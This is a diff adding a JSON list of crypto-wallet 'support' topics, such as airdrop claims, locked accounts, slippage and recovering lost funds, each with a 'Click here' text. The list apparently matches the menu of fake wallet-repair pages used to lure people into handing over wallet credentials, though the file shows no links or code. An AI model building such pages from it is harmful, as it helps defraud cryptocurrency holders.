@@ -1,0 +1,86 @@
+[
+    {
+        "title": "Migration",
+        "text": "Click here for migration"
+    },
+    {
+        "title": "Claim Token",
+        "text": "Click here to claim assets"
+    },
+    {
+        "title": "Swap",
+        "text": "Click here for assets swapping"
+    },
+    {
+        "title": "Slippage",
+        "text": "Click here for slippage related error."
+    },
+    {
+        "title": "Exchange",
+        "text": "Click here for exchange related issues"
+    },
+    {
+        "title": "Connect to Dapps",
+        "text": "Click here for error while connectting to dapps"
+    },
+    {
+        "title": "NFT Rarity and traits",
+        "text": "Click here for Nft related issues."
+    },
+    {
+        "title": "Whitelist",
+        "text": "Click here for whitelist related issues."
+    },
+    {
+        "title": "Login",
+        "text": "Click here for wallet login issue."
+    },
+    {
+        "title": "Transaction",
+        "text": "Click here for transaction related issues."
+    },
+    {
+        "title": "Cross Transfer",
+        "text": "Click here for cross bridge issues."
+    },
+    {
+        "title": "Staking",
+        "text": "Click here for staking related issues."
+    },
+    {
+        "title": "Buy Coins/Tokens",
+        "text": "To trade, your account must be marked as a trusted payment source."
+    },
+    {
+        "title": "Missing/Irregular balance",
+        "text": "Click here to recover lost/missing funds."
+    },
+    {
+        "title": "Wallet glitch / wallet error",
+        "text": "Click here if you have problem with your trading wallet."
+    },
+    {
+        "title": "Transaction Delay",
+        "text": "Click here for any issues related to transaction delay."
+    },
+    {
+        "title": "Claim Airdrop",
+        "text": "Click here for airdrop related issues."
+    },
+    {
+        "title": "NFTs",
+        "text": "Click here for NFTs minting/transfer related issues."
+    },
+    {
+        "title": "Locked Account",
+        "text": "Click here for issues related to account lock."
+    },
+    {
+        "title": "Presale",
+        "text": "Click here to buy/claim presale token"
+    },
+    {
+        "title": "Reward",
+        "text": "Click here for reward related issues."
+    }
+]
